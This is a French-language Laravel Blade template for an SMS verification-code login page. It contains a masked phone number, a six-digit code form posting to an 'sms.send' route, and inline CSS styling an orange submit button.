@extends('layouts.app')

@section('content')
<div class="code-container">
   
    <div class="code-box">

        <div class="code-info">
        <h2 class="code-title">Entrer le code SMS</h2>

            <p>Le code a été envoyé au <strong>+33 X XX XX XX XX</strong>.</p>
            <p>Le code peut mettre quelques minutes à arriver.</p>
            <a href="#">Ce numéro est incorrect ?</a>
        </div>

        <form action="{{ route('sms.send') }}" method="POST">
            @csrf
            <div class="form-group">
                <label for="sms">Code reçu par SMS</label>
                <input type="text" id="sms" name="sms" maxlength="6" placeholder="******" required>
            </div>

            <button type="submit" name="submitsms" class="btn-orange">
                Se connecter
            </button>
        </form>
    </div>
</div>
<style>

.code-container {
    display: flex;
    justify-content: center;
    align-items: center;
    
}

.code-box {
    
    padding: 20px;
    text-align: center;
    max-width: 400px;
    width: 100%;
}

/* Titre */
.code-title {
    font-weight: 600;
    margin-bottom: 1.5rem;
}

/* Texte explicatif */
.code-info {
    margin-bottom: 1.5rem;
    text-align: left;
}

.code-info a {
    color: black;
    font-size: 12px;
    font-weight: 500;
}

.code-info a:hover {
    text-decoration: underline;
}

/* Champ de saisie */
.form-group {
    margin-bottom: 1rem;
    text-align: left;
}

.form-group input[type="text"] {
    width: 100%;
    padding: 10px 15px;
    border: 1px solid #ccc;
    border-radius: 999px;
    text-align: center;
    font-size: 1rem;
}

/* Bouton */
.btn-orange {
    background-color: #f04400;
    color: white;
    border: none;
    padding: 10px 30px;
    border-radius: 999px;
    font-weight: 500;
    cursor: pointer;
    transition: background-color 0.3s;
}

.btn-orange:hover {
    background-color: #c83700;
}
@media (max-width: 768px) {
    .form-group input[type="text"]{
        width: 80%;
    }
}

</style>
@endsection
